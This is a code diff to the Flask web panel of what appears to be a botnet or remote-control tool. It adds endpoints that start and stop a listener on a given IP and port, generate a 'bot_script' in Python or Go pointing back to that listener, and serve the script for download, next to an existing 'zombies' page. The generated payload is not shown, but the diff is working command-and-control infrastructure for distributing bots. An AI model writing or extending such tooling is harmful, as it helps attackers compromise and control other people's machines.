@@ -4,12 +4,15 @@
 This script will be run when --web argument is set instead of gui window
 '''
 
-from flask import Flask ,request ,redirect ,render_template, Response
+from flask import Flask ,request ,redirect ,render_template, Response, send_from_directory
 import logging
 from time import sleep
 from threading import Thread
 from modules.get_modules import get_config_value
 from modules.server import ServerModule
+from modules.logger import Logger
+from modules.create_script import ScriptCreator
+import os
 
 # if you start the server for first time cookies will be cleared
 UseSSL = None
@@ -17,13 +20,17 @@ UseSSL = None
 # (global variables) for communicating between program parts
 serverModuleVar = None
 connectionStatusVar = None
-
+serverLogger = Logger(file_name='server')
 
 def main_web_start(use_ssl):
     UseSSL = use_ssl
     template_folder_path ='main/web/templates/'
     static_folder_path = 'main/web/static/'
     app_main = Flask('__main__' ,template_folder=template_folder_path ,static_folder=static_folder_path)
+
+    # set upload dir
+    UPLOAD_FOLDER = './'
+    app_main.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
     # disable flask url logging
     log = logging.getLogger('werkzeug')
@@ -84,17 +91,30 @@ def main_web_start(use_ssl):
                 except Exception:
                     continue
 
-    @app_main.route('/server_conf', methods=['POST', 'GET'])
-    def server_conf_url():
-        if request.method == 'POST':
-            return 'done server start'
-            # if request.form['lip'] and request.form['lport']:
-            #     serverModule = ServerModule(lip=request.form['lip'], lport=request.form['lport'], is_from_gui=False)
-            #     serverModule.start_server()
-            #     return 'An Error Occurred'
+    @app_main.route('/server_conf_stop', methods=['POST'])
+    def server_conf_stop_url():
+        global serverModuleVar
+        if request.form['stop_server']:
+            if request.form['stop_server'] == 'True':
+                try:
+                    serverModuleVar.stop_server()
+                except AttributeError:
+                    serverLogger.log(text='Start The Server First')
 
-        elif request.method == 'GET':
-            return Response(stream_server_file(), mimetype="text/plain", content_type="text/event-stream")
+        return 'Request StopServer Sent'
+
+    @app_main.route('/server_conf_start', methods=['POST'])
+    def server_conf_start_url():
+        global serverModuleVar
+        if request.form['lip'] and request.form['lport']:
+            serverModuleVar = ServerModule(lip=request.form['lip'], lport=request.form['lport'], is_from_gui=False)
+            serverModuleVar.start_server()
+
+        return 'Request ServerStart Sent'
+
+    @app_main.route('/server_conf', methods=['GET'])
+    def server_conf_url():
+        return Response(stream_server_file(), mimetype="text/plain", content_type="text/event-stream")
 
     # Find the last line of the create_script file
     with open('main/web/static/files/create_script.txt', 'r') as file_create_script:
@@ -113,18 +133,38 @@ def main_web_start(use_ssl):
                 except Exception:
                     continue
 
-    @app_main.route('/create_script_conf', methods=['POST', 'GET'])
+    @app_main.route('/create_script_conf', methods=['GET'])
     def create_script_conf():
-        if request.method == 'POST':
-            return 'done create script'
-        elif request.method == 'GET':
-            return Response(stream_create_script_file(), mimetype="text/plain", content_type="text/event-stream")
+         return Response(stream_create_script_file(), mimetype="text/plain", content_type="text/event-stream")
+
+    @app_main.route('/create_script_conf_create', methods=['POST'])
+    def create_script_create_url():
+        script_creator = ScriptCreator(lhost=request.form['localhost'], lport=request.form['localport'],
+                                       lang=request.form['lang_create_script'], is_from_gui=False)
+        script_creator.create()
+
+        return 'CreateScript Request Sent'
 
     @app_main.route('/create_script')
     def create_script_url():
         from main.web.functions.create_script_web import CreateScriptWeb
         create_script_web_ret = CreateScriptWeb().run()
         return create_script_web_ret
+
+    @app_main.route('/download_script')
+    def download_script_url():
+
+        allowed_langs = ['py','go']
+        if request.args.get('script_lang'):
+            script_lang = request.args.get('script_lang')
+            if script_lang in allowed_langs:
+                script_name = 'bot_script.{}'.format(script_lang)
+                return send_from_directory(directory=app_main.root_path, path=script_name)
+
+            else:
+                return 'Language Not Found'
+        else:
+            return 'Language Not Found'
 
     @app_main.route('/zombies')
     def zombies_url():
